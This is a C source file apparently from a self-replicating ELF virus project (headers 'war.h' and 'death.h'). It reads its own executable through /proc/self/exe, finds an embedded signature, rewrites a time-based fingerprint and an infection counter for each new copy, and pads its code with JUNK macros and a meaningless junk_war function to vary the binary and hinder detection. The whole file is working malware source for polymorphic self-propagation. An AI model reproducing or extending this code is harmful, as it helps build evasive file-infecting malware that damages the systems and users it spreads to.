#include "death.h"
#include "war.h"
#include "utils.h"
#include "syscall.h"

#define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
#define FNV_PRIME_64 0x00000100000001b3

extern char g_signature[SIGNATURE_SIZE];
extern void _start(void);

static uint64_t fnv1a_64(const void *data, size_t len) {

	uint64_t hash = FNV_OFFSET_BASIS_64;
	for (size_t i = 0; i < len; i++) {
		hash ^= ((uint8_t *)data)[i];
		hash *= FNV_PRIME_64;
	}
	return hash;
}

static void hash_to_printable(uint64_t hash, char *fingerprint) {
	/* replace later with sizeof(hash) */
	for (size_t i = 0; i < 8; i++) {
		fingerprint[i] = (hash % 94) + 33;
		hash /= 94;
	}
}

void update_fingerprint(char *fingerprint, data_t *data) {
	struct timeval tv;

	uint64_t hash = fnv1a_64(data->bs_data->argv[0], ft_strlen(data->bs_data->argv[0]));

	gettimeofday(&tv, NULL);

	uint64_t ns = tv.tv_sec * 1000000 + tv.tv_usec;
	hash ^= fnv1a_64(&ns, sizeof(ns));

	hash_to_printable(hash, fingerprint);
}

static void hash_with_time(char *fingerprint) {
	struct timeval tv;
	gettimeofday(&tv, NULL);

	uint64_t ns = tv.tv_sec * 1000000 + tv.tv_usec;
	uint64_t hash = fnv1a_64(&ns, sizeof(ns));
	hash_to_printable(hash, fingerprint);
}

static void increment_counter(char *counter) {

	for (int i = 3; i >= 0; i--) {
		if (counter[i] == '9') {
			counter[i] = '0';
		} else {
			counter[i] += 1;
			break;
		}
	}

	JUNK;
}

static int abs_path(char *self_name) {
	char buf[PATH_MAX];
	char proc_self_exe[] = "/proc/self/exe"; JUNK;

	int ret = readlink(proc_self_exe, buf, PATH_MAX);
	if (ret == -1) {
		return -1;
	}
	buf[ret] = '\0';

	ft_strncpy(self_name, buf, PATH_MAX); JUNK;

	return 0;
}

int war(size_t increment, file_t *file, int start_offset) {

	char self_name[PATH_MAX];

	if (abs_path(self_name) == -1) {
		return -1;
	} JUNK;

	struct stat st;
	/* we could open the file with O_RDWR but text file is busy */
	int fd = open(self_name, O_RDONLY);

	if (fd == -1) {
		return -1;
	}

	if (fstat(fd, &st) == -1) {
		close(fd);
		return -1;
	}

	/* we could use MAP_SHARED but we can't open the file with O_RDWR */
	uint8_t *self = (uint8_t *)mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (self == MAP_FAILED) {
		close(fd);
		return -1;
	} JUNK;

	close(fd);

	//char signature[] = "\x51\x19\x2b\x0b\xd1\x59\x1f\xfd\x3c\x13\x2e\x1a\xdd\x59\x55\xe7\x35\x27\x2e\x16\xcb\x16\x4e\xfb\x67\x21";
	//
	//encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);
	uintptr_t signature_offset = (uintptr_t)&g_signature - (uintptr_t)&_start;

	//char *found = ft_memmem(self, st.st_size, signature, ft_strlen(signature));
	//if (found == NULL) {
	//	munmap(self, st.st_size);
	//	return -1;
	//}
	//
	char *found = (char *)(self + start_offset + signature_offset);

	char *fingerprint = found + SIGNATURE_SIZE - 15;
	hash_with_time(fingerprint); JUNK;

	char *counter = found + SIGNATURE_SIZE - 6;

	while (increment--) {
		increment_counter(counter);
	}

	file->view = (fileview_t){.data = self, .size = st.st_size};
	file->mode = st.st_mode;
	ft_strncpy(file->abs_path, self_name, PATH_MAX); JUNK;

	return 0;
}

/* junk */

void junk_war(void) 
{
	struct {
		union {
			struct {
				unsigned char r;
				unsigned char g;
				unsigned char b;
				unsigned char a;
			} ba;
			struct {
				unsigned int c;
			} bc;
			struct {
				unsigned int	ba : 1;
				unsigned int	ca : 1;
				unsigned int	da : 1;
				unsigned int	ea : 1;
				unsigned int	fa : 1;
				unsigned int	ga : 1;
				unsigned int	ha : 1;
				unsigned int	ia : 1;
				unsigned int	ja : 1;
				unsigned int	ka : 1;
				unsigned int	la : 1;
				unsigned int	ma : 1;
				unsigned int	na : 1;
				unsigned int	oa : 1;
				unsigned int	pa : 1;
				unsigned int	qa : 1;
				unsigned int	ra : 1;
				unsigned int	sa : 1;
				unsigned int	ta : 1;
				unsigned int	ua : 1;
				unsigned int	va : 1;
				unsigned int	wa : 1;
				unsigned int	xa : 1;
				unsigned int	ya : 1;
				unsigned int	za : 1;
				unsigned int	zb : 1;
				unsigned int	zc : 1;
				unsigned int	zd : 1;
				unsigned int	ze : 1;
				unsigned int	zf : 1;
				unsigned int	zg : 1;
				unsigned int	zh : 1;
			} aa;
		} bu;
	} bs;

	bs.bu.ba.a = 255;
	bs.bu.ba.b = 91;
	bs.bu.ba.g = 41;
	bs.bu.ba.r = 156;
	
//	bs.bu.bc.c = 4096;

	for (int i = 0; i < 1; i++)
	{
		bs.bu.bc.c = (bs.bu.bc.c << 1 ) ^ (bs.bu.bc.c >> 15);
		bs.bu.aa.ba = (bs.bu.aa.ra & bs.bu.aa.ca) ^ bs.bu.aa.ya;
		bs.bu.aa.ca = (bs.bu.aa.ya & bs.bu.aa.da) ^ bs.bu.aa.zb;
		bs.bu.aa.da = (bs.bu.aa.zb & bs.bu.aa.ea) ^ bs.bu.aa.ha;
		bs.bu.aa.ea = (bs.bu.aa.ha & bs.bu.aa.fa) ^ bs.bu.aa.qa;
		bs.bu.aa.fa = (bs.bu.aa.qa & bs.bu.aa.ga) ^ bs.bu.aa.ba;
		bs.bu.aa.ga = (bs.bu.aa.ba & bs.bu.aa.ha) ^ bs.bu.aa.zc;
		bs.bu.aa.ha = (bs.bu.aa.zc & bs.bu.aa.ia) ^ bs.bu.aa.zg;
		bs.bu.aa.ia = (bs.bu.aa.zg & bs.bu.aa.ja) ^ bs.bu.aa.ja;
		bs.bu.aa.ja = (bs.bu.aa.ja & bs.bu.aa.ka) ^ bs.bu.aa.ga;
		bs.bu.aa.ka = (bs.bu.aa.ga & bs.bu.aa.la) ^ bs.bu.aa.oa;
		bs.bu.aa.la = (bs.bu.aa.oa & bs.bu.aa.ma) ^ bs.bu.aa.va;
		bs.bu.aa.ma = (bs.bu.aa.va & bs.bu.aa.na) ^ bs.bu.aa.zf;
		bs.bu.aa.na = (bs.bu.aa.zf & bs.bu.aa.oa) ^ bs.bu.aa.ze;
		bs.bu.aa.oa = (bs.bu.aa.ze & bs.bu.aa.pa) ^ bs.bu.aa.fa;
		bs.bu.aa.pa = (bs.bu.aa.fa & bs.bu.aa.qa) ^ bs.bu.aa.wa;
		bs.bu.aa.qa = (bs.bu.aa.wa & bs.bu.aa.ra) ^ bs.bu.aa.ua;
		bs.bu.aa.ra = (bs.bu.aa.ua & bs.bu.aa.sa) ^ bs.bu.aa.ma;
		bs.bu.aa.sa = (bs.bu.aa.ma & bs.bu.aa.ta) ^ bs.bu.aa.na;
		bs.bu.aa.ta = (bs.bu.aa.na & bs.bu.aa.ua) ^ bs.bu.aa.sa;
		bs.bu.aa.ua = (bs.bu.aa.sa & bs.bu.aa.va) ^ bs.bu.aa.pa;
		bs.bu.aa.va = (bs.bu.aa.pa & bs.bu.aa.wa) ^ bs.bu.aa.za;
		bs.bu.aa.wa = (bs.bu.aa.za & bs.bu.aa.xa) ^ bs.bu.aa.ia;
		bs.bu.aa.xa = (bs.bu.aa.ia & bs.bu.aa.ya) ^ bs.bu.aa.zd;
		bs.bu.aa.ya = (bs.bu.aa.zd & bs.bu.aa.za) ^ bs.bu.aa.ka;
		bs.bu.aa.za = (bs.bu.aa.ka & bs.bu.aa.zb) ^ bs.bu.aa.la;
		bs.bu.aa.zb = (bs.bu.aa.la & bs.bu.aa.zc) ^ bs.bu.aa.ca;
		bs.bu.aa.zc = (bs.bu.aa.ca & bs.bu.aa.zd) ^ bs.bu.aa.ta;
		bs.bu.aa.zd = (bs.bu.aa.ta & bs.bu.aa.ze) ^ bs.bu.aa.xa;
		bs.bu.aa.ze = (bs.bu.aa.xa & bs.bu.aa.zf) ^ bs.bu.aa.da;
		bs.bu.aa.zf = (bs.bu.aa.da & bs.bu.aa.zg) ^ bs.bu.aa.ea;
		bs.bu.aa.zg = (bs.bu.aa.ea & bs.bu.aa.zh) ^ bs.bu.aa.zh;
		bs.bu.aa.zh = (bs.bu.aa.zh & bs.bu.aa.ia) ^ bs.bu.aa.ba;
	}
}
